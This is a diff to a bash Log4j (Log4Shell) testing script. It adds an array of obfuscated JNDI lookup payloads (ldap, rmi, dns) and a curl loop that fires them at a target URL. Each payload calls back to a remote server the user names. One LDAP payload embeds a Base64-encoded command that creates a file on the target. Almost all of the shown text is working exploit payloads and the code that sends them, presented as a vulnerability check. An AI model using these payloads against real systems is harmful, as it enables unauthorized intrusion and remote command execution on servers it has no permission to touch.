@@ -42,10 +42,30 @@ payload=("X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${
 	"User-Agent: \${\${lower:j}\${upper:n}\${lower:d}\${upper:i}:\${lower:r}m\${lower:i}}://$dns/a}" #22
 	"User-Agent: \${jndi:dns://$dns}" #23
     )
+
+payload2=("\$\{\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://$dns/a" #0
+    "\$\{jndi:ldap://$dns/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}" #1
+    "\$\{jndi:\${lower:l}\${lower:d}a\${lower:p}://$dns/a" #2
+    "\$\{\${env:TEST:-j}ndi\${env:TEST:-:}\${env:TEST:-l}dap\${env:TEST:-:}//$dns/a" #3
+    "\$\{\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://$dns/a" #4
+    "\$\{\${::-j}ndi:rmi://$dns/a\}" #5
+    "\$\{jndi:rmi://$dns\}" #6
+    "\$\{\${lower:jndi}:\${lower:rmi}://$dns/a\}" #7
+    "\$\{\${lower:\${lower:jndi}}:\${lower:rmi}://$dns/a\}" #8
+    "\$\{\${lower:j}\${lower:n}\${lower:d}i:\${lower:rmi}://$dns/a\}" #9
+    "\$\{\${lower:j}\${upper:n}\${lower:d}\${upper:i}:\${lower:r}m\${lower:i}}://$dns/a\}" #10
+    "\$\{jndi:dns://$dns\}" # 11
+    "\$\{jndi:ldap://$dns\}"
+    )
+
+
 echo -e "${Cyan}Log4j Testing on = ${GREEN} $1 ${STOP}\n"
 echo -e "${Cyan}your Remote server =${GREEN} $2 ${STOP}\n"
 echo ""
+for a in {1..11} ; do curl --silent --max-time 10 $url/${payload2[$a]} -i && echo -e "${Gcyan} Your Current Payload is = ${payload2[$a]} ${STOP}\n" ; done
+
 for i in {0..23} ; do curl --silent --max-time 10 $url -H "${payload[$i]}" && echo -e "${Gcyan} Your Current Payload is = ${payload[$i]} ${STOP}\n" ; done
+
 echo -e " ${STOP}\n"
 echo -e "${GREEN}Please Check your Remote Server,${STOP}\n"
-echo -e "${Cyan}If It's vulnerable to ${Gcyan}Log4j${Cyan},It Will Get a DNS Ping Massage on your Remote Server ${STOP} \n"
+echo -e "${Cyan}If It's vulnerable to ${Gcyan}Log4j${Cyan}, Will Get a DNS Ping Massage on your Remote Server ${STOP} \n"
